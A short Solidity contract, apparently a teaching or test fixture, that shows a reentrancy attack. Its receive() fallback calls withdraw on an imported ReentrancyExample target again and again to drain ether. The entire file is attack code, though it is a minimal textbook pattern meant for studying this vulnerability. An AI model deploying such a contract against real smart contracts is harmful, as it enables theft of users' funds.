// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ReentrancyExample.sol";

contract ReentrancyAttack {
  ReentrancyExample public target;
  uint public count;

  constructor(address _target) {
    target = ReentrancyExample(_target);
  }

  function attack() public payable {
    count++;
    if (count < 10) {
      target.withdraw(1 ether);
    }
  }

  receive() external payable {
    if (count < 10) {
      target.withdraw(1 ether);
    }
  }
}
